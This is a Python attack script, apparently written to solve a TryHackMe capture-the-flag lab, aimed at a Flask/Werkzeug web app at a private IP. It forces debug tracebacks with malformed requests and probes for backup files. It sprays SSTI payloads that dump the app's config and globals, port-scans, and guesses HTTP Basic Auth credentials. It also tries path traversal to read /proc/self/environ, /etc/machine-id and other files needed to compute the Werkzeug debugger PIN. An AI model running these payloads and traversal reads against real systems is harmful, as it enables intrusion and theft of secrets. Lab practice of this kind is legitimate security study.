import requests
import re
import urllib.parse

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# Try to trigger errors to get Werkzeug debug traceback
print("=== Trigger errors ===")

# 1) Invalid URL encoding
error_urls = [
    "/%00",          # null byte
    "/%ff",          # invalid utf-8
    "/%80",          # invalid utf-8
    "/\x00",         # null byte
    "/?test=%ff",    # invalid param encoding
    "/?test[]=%ff",  # PHP-style array param
    "/cupids_secret_vault/?%ff=%ff",
    "/cupids_secret_vault/" + "A" * 10000,  # long path
]

for url in error_urls:
    try:
        r = s.get(f"{BASE}{url}", timeout=5, allow_redirects=False)
        if r.status_code == 500 or "Traceback" in r.text or "debugger" in r.text.lower():
            print(f"  {url[:80]} -> {r.status_code} ({len(r.text)} bytes) INTERESTING!")
            print(f"    {r.text[:500]}")
        elif r.status_code not in [200, 301, 302, 308, 404]:
            print(f"  {url[:80]} -> {r.status_code}")
    except Exception as e:
        print(f"  {url[:80]} -> {e}")

# 2) Try to cause type errors with special headers
print("\n=== Weird headers ===")
weird_headers = [
    {"Content-Length": "-1"},
    {"Transfer-Encoding": "chunked"},
    {"Host": ""},
    {"Content-Type": "multipart/form-data; boundary=----"},
]
for h in weird_headers:
    try:
        r = s.get(f"{BASE}/", headers=h, timeout=5)
        if r.status_code == 500 or "Traceback" in r.text:
            print(f"  Headers {h} -> {r.status_code} INTERESTING!")
            print(f"    {r.text[:500]}")
        elif r.status_code != 200:
            print(f"  Headers {h} -> {r.status_code}")
    except Exception as e:
        print(f"  Headers {h} -> {e}")

# 3) Try the vault with file extension patterns
print("\n=== File extensions on vault ===")
exts = [
    ".html", ".txt", ".json", ".xml", ".py", ".bak", ".old", ".swp",
    ".php", ".asp", ".jsp", ".log", ".cfg", ".ini", ".conf",
    ".zip", ".tar.gz", ".sql", ".db", ".sqlite", ".sqlite3",
]
for ext in exts:
    try:
        r = s.get(f"{BASE}/cupids_secret_vault{ext}", timeout=3)
        if r.status_code != 404:
            print(f"  /cupids_secret_vault{ext} -> {r.status_code} ({len(r.text)} bytes)")
    except:
        pass

# 4) Check if SSTI is reflected but we need to look in specific place
# Try SSTI in various ways - maybe the vault renders user input somewhere
print("\n=== Careful SSTI check ===")
ssti_payloads = [
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("{{config}}", "SECRET_KEY"),
    ("{{config.items()}}", "SECRET"),
    ("{{request.application.__globals__}}", "__builtins__"),
    ("{{''.__class__.__mro__}}", "object"),
    ("{{'SSTI_TEST'}}", "SSTI_TEST"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
]

for payload, indicator in ssti_payloads:
    for param in ["name", "letter", "page", "q", "template", "file"]:
        try:
            r = s.get(f"{BASE}/cupids_secret_vault/", 
                     params={param: payload}, timeout=5)
            if indicator in r.text and indicator not in requests.get(f"{BASE}/cupids_secret_vault/", timeout=5).text:
                print(f"  SSTI HIT! ?{param}={payload} -> found '{indicator}'")
                print(f"    {r.text[:300]}")
        except:
            pass

# Also try on root
for payload, indicator in ssti_payloads:
    for param in ["name", "letter", "page", "q", "template", "file"]:
        try:
            r = s.get(f"{BASE}/", params={param: payload}, timeout=5)
            if indicator in r.text and indicator not in requests.get(f"{BASE}/", timeout=5).text:
                print(f"  SSTI HIT on /! ?{param}={payload} -> found '{indicator}'")
                print(f"    {r.text[:300]}")
        except:
            pass

# 5) Maybe there's a different port? Quick nmap-like scan
print("\n=== Quick port scan on common web ports ===")
import socket
ports_to_check = [80, 443, 3000, 8000, 8080, 8443, 8888, 9000, 9090, 5001, 4000, 3001]
for port in ports_to_check:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex(('10.114.139.59', port))
    if result == 0:
        print(f"  Port {port} is OPEN")
        try:
            r = requests.get(f"http://10.114.139.59:{port}/", timeout=3)
            print(f"    HTTP -> {r.status_code} ({len(r.text)} bytes)")
        except:
            pass
    sock.close()

# 6) Maybe HTTP Basic Auth on specific paths
print("\n=== Basic Auth ===")
auth_paths = ["/cupids_secret_vault/", "/console", "/admin/", "/"]
creds = [
    ("cupid", "cupid_arrow_2026!!!"),
    ("admin", "cupid_arrow_2026!!!"),
    ("cupid", "arrow2026"),
    ("love", "cupid_arrow_2026!!!"),
    ("anonymous", "cupid_arrow_2026!!!"),
]
for path in auth_paths:
    for user, pwd in creds:
        try:
            r = s.get(f"{BASE}{path}", auth=(user, pwd), timeout=5)
            default = s.get(f"{BASE}{path}", timeout=5)
            if len(r.text) != len(default.text) or r.status_code != default.status_code:
                print(f"  {path} with {user}:{pwd} -> {r.status_code} ({len(r.text)} vs {len(default.text)} bytes)")
                print(f"    {r.text[:300]}")
        except:
            pass

# 7) Check for Werkzeug debugger PIN calculation opportunity
# Need: /proc/self/environ, /proc/self/cgroup, /sys/class/net/*/address
# Try path traversal from /console route
print("\n=== Werkzeug PIN calc attempt ===")
# Try to read server info through various means
for f in [
    "/proc/self/environ",
    "/proc/self/cgroup",  
    "/proc/self/status",
    "/proc/self/cmdline",
    "/proc/1/cgroup",
    "/sys/class/net/eth0/address",
    "/etc/machine-id",
    "/proc/sys/kernel/random/boot_id",
]:
    for prefix in ["", "/cupids_secret_vault"]:
        try:
            # Via path param
            r = s.get(f"{BASE}{prefix}/", params={"file": f"../{f}"}, timeout=3)
            if len(r.text) > 200 and "root" in r.text.lower():
                print(f"  {prefix}/?file=../{f} -> readable!")
                print(f"    {r.text[:200]}")
        except:
            pass

print("\nDone.")
